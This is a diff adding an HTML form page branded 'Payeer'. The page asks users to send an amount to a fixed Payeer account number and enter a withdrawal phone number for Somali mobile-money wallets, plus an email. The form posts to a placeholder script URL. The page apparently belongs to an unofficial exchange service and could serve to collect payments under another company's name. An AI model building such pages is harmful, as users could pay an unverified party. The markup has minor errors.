@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payeer</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  
+    <div class="container">
+        <h2>PAYEER</h2>
+            <form action="YOUR_SCRIPT_URL" method="POST">
+            <input type="number" id="amount" name="data[amount]" placeholder="Enter the amount">
+            <p>Use this guide to send</p>
+            <div>
+                <b>P1125054549</b>
+            </div>
+          <input type="text" id="wallet" name="From Deposit]" placeholder="From Deposit                                                P********">
+
+                <div onclick="generateNumber()"></div>
+
+            <input type="text" id="phoneNumber" name="data[To Withdraw]" placeholder="To Withdraw                                    ">
+            <select id="walletType" name="data[Wallet Type]">
+                <option value="" disabled selected>Select Wallet Type</option>
+                <option value="Evc">Evc</option>
+                <option value="Zaad">Zaad</option>
+                <option value="eDahab">eDahab</option
+                                <option value="Sahal">Sahal</option>
+  
+                                                                <option value="EBIRR">EBIRR</option>
+
+                <option value="Jeeb">Jeeb</option>
+
+            </select>
+            
+
+            
+            <input type="email" id="email" name="data[email]" placeholder="Enter your Email">
+                    <h1 id="numberDisplay"></h1>
+ 
+            <button type="button" id="completeButton">Complete</button>
+        </form>
+
+    </div>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <span id="closePopup">&times;</span>
+            <p id="popupMessage"></p>
+        </div>
+    </div>
+    
+
+
+    <script src="main.js"></script>
+    
